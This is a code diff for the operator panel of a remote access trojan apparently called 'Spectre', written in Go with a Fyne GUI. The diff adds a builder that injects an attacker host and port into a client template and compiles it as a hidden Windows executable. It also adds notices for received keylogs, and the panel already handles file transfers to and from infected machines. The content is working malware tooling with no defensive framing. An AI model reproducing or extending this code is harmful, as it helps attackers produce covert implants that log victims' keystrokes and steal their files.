@@ -7,6 +7,7 @@ import (
 	"image/jpeg"
 	"net"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -36,7 +37,9 @@ var (
 
 	table     *widget.Table
 	Display   *widget.Entry
+	Building  *widget.Entry
 	myApp     fyne.App
+	myWindow  fyne.Window
 	streaming = false
 
 	filename string
@@ -159,6 +162,7 @@ func handleClient(client *Connection) {
 			case "<LOG>":
 				data := readAll("<END>")
 				os.WriteFile(fmt.Sprintf("%v@%v.log", selected.hostname, selected.ip), []byte(data), 0644)
+				dialog.NewInformation("Keylog Saved!", fmt.Sprintf("Keylog saved in '%v@%v.log'", selected.hostname, selected.ip), myWindow).Show()
 
 			case "<DOWNLOAD>":
 				for {
@@ -193,14 +197,24 @@ func main() {
 	myApp = app.New()
 	myApp.Settings().SetTheme(theme.LightTheme())
 
-	myWindow := myApp.NewWindow("Spectre")
+	myWindow = myApp.NewWindow("Spectre")
 	myWindow.Resize(fyne.NewSize(900, 600))
 	myWindow.SetFixedSize(true)
 	myWindow.SetIcon(theme.VisibilityIcon())
 
+	Building = widget.NewMultiLineEntry()
+	Building.SetPlaceHolder("Build status...")
+	Building.SetMinRowsVisible(22)
+
 	Display = widget.NewMultiLineEntry()
 	Display.SetPlaceHolder("Your responses will appear here...")
-	Display.SetMinRowsVisible(21)
+	Display.SetMinRowsVisible(26)
+
+	portEntry := widget.NewEntry()
+	portEntry.PlaceHolder = "Port..."
+
+	hostEntry := widget.NewEntry()
+	hostEntry.PlaceHolder = "Host..."
 
 	err := dialog.NewError(errors.New("No client selected!"), myWindow)
 
@@ -440,7 +454,6 @@ func main() {
 								writeCommand(string(data))
 								writeCommand("<END>")
 							}
-
 						} else {
 							dialog.NewError(errors.New("File not found!"), myWindow)
 						}
@@ -456,9 +469,62 @@ func main() {
 
 	tabs := container.NewAppTabs(
 		container.NewTabItemWithIcon("Home", theme.HomeIcon(), container.NewBorder(nil, nil, nil, container.NewVScroll(toolbar), table)),
-		container.NewTabItemWithIcon("Builder", theme.SettingsIcon(), container.NewVBox()),
-		container.NewTabItemWithIcon("Logs", theme.DocumentIcon(), container.NewBorder(container.NewVBox(widget.NewLabelWithStyle("Logs", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}), Display), widget.NewButton("Save Log", func() { os.WriteFile("log.log", []byte(Display.Text), 0644) }), nil, nil)),
+		container.NewTabItemWithIcon("Builder", theme.SettingsIcon(), container.NewVBox(
+			widget.NewLabelWithStyle("Builder", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
+			Building,
+			hostEntry,
+			portEntry,
+			widget.NewCard("", "", widget.NewButton("Build", func() {
+				port, err := strconv.Atoi(portEntry.Text)
+				if strings.TrimSpace(hostEntry.Text) != "" && port > 0 && port < 65537 && err == nil {
+					Building.SetText(Building.Text + "[+] Building process initialised.\n")
+					data, err := os.ReadFile("..\\CLIENT\\client.go")
+					if err != nil {
+						Building.SetText(Building.Text + "[-] Client code not found.\n")
+					} else {
+						os.Mkdir("build", 0644)
+						os.Chdir("build")
+						Building.SetText(Building.Text + "[+] Client code successfully opened.\n")
+
+						code := strings.Replace(string(data), "<HOST>", hostEntry.Text, 1)
+						code = strings.Replace(code, "<PORT>", portEntry.Text, 1)
+
+						Building.SetText(Building.Text + "[+] HOST/PORT parameters injected.\n")
+						os.WriteFile("build.go", []byte(code), 0644)
+						Building.SetText(Building.Text + "[+] Client process closed.\n")
+						Building.SetText(Building.Text + "[+] Golang compiler detected and ready.\n")
+						Building.SetText(Building.Text + "[+] Compilation process started.\n")
+						exec.Command("go.exe", "mod", "init", "build").Run()
+						exec.Command("go.exe", "mod", "tidy").Run()
+						exec.Command("go.exe", "build", "--ldflags", "-s -H windowsgui", "build.go").Run()
+						Building.SetText(Building.Text + "[+] Compilation completed successfully.\n")
+						Building.SetText(Building.Text + "[+] Build process completed successfully!\n\n")
+						os.Remove("go.mod")
+						os.Remove("go.sum")
+						os.Remove("build.go")
+						os.Chdir("..")
+					}
+
+				} else {
+					Building.SetText(Building.Text + "[-] Failed to start the build due to invalid HOST/PORT parameters!\n\n")
+					dialog.NewError(errors.New("Invalid input detected!"), myWindow).Show()
+				}
+				hostEntry.SetText("")
+				portEntry.SetText("")
+			})),
+		)),
+		container.NewTabItemWithIcon("Logs", theme.DocumentIcon(),
+			container.NewVBox(
+				widget.NewLabelWithStyle("Logs", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
+				Display,
+				widget.NewCard("", "", widget.NewButton("Save Log", func() {
+					os.WriteFile("LOG.log", []byte(Display.Text), 0644)
+					dialog.NewInformation("Log Saved!", "Log saved in 'LOG.log'", myWindow).Show()
+				})),
+			),
+		),
 	)
+
 	tabs.SetTabLocation(container.TabLocationLeading)
 
 	myWindow.SetContent(tabs)
